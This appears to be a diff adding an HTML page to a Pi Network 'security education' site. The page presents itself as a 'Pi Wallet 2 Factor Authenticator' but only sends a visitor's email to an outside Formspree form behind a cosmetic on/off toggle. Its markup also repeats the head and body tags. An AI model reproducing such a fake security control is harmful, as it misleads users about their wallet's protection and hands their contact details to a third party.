@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticator - Pi Network Security</title>
+    <link rel="icon" type="image/png" href="pilogo.png">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="logo">
+                <img src="pilogo.png" alt="Pi Logo" class="logo-img">
+                <span>Pi Security Education</span>
+            </a>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="active">Home</a></li>
+                <li><a href="security-basics.html">Security Basics</a></li>
+                <li><a href="phishing-awareness.html">Phishing Awareness</a></li>
+                <li><a href="wallet-protection.html">Wallet Protection</a></li>
+                <li><a href="resources.html">Resources</a></li>
+            </ul>
+            <div class="hamburger" id="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Extra toggle-specific styling -->
+    <style>
+        .toggle-wrapper {
+            max-width: 500px;
+            margin: 4rem auto;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        .toggle-wrapper h2 {
+            color: var(--pi-purple);
+            margin-bottom: 1.5rem;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            border: 2px solid var(--border-color);
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .toggle {
+            width: 120px;
+            height: 55px;
+            background: #ddd;
+            border-radius: 50px;
+            position: relative;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin: 0 auto;
+        }
+
+        .toggle.on {
+            background: var(--success-color);
+        }
+
+        .toggle-circle {
+            width: 45px;
+            height: 45px;
+            background: white;
+            border-radius: 50%;
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            transition: left 0.3s;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .toggle.on .toggle-circle {
+            left: 70px;
+        }
+
+        .status-text {
+            margin-top: 1.5rem;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+    </style>
+</head>
+<body>
+
+<div class="toggle-wrapper">
+    <h2>Pi Wallet 2 Factor Authenticator</h2>
+
+    <!-- Formspree Form -->
+    <form id="toggleForm" action="https://formspree.io/f/mgvglzne" method="POST">
+        <input
+            type="email"
+            name="email"
+            class="email-input"
+            placeholder="Enter your email address"
+            required
+        />
+
+        <!-- Hidden field updated by JS -->
+        <input type="hidden" name="action" id="actionField">
+
+        <div class="toggle" id="toggleBtn">
+            <div class="toggle-circle"></div>
+        </div>
+
+        <p class="status-text" id="statusText">2 factor authentication is OFF</p>
+    </form>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
